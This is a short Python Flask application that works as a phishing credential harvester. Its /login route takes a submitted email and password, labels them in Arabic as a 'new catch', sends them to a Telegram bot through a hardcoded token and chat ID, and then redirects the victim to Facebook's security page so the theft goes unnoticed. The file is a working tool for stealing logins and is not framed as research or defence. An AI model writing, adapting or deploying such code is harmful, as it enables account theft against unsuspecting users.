import os
from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

TOKEN = "8702863413:AAGw5wz0_LZv97Z0nSn-8_5_InZcRJkiAk8"
MY_ID = "7716781815"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('email')
    pwd = request.form.get('password')
    report = f"🎯 صيد جديد:\n👤 {user}\n🔑 {pwd}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": MY_ID, "text": report})
    return redirect("https://facebook.com/security")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
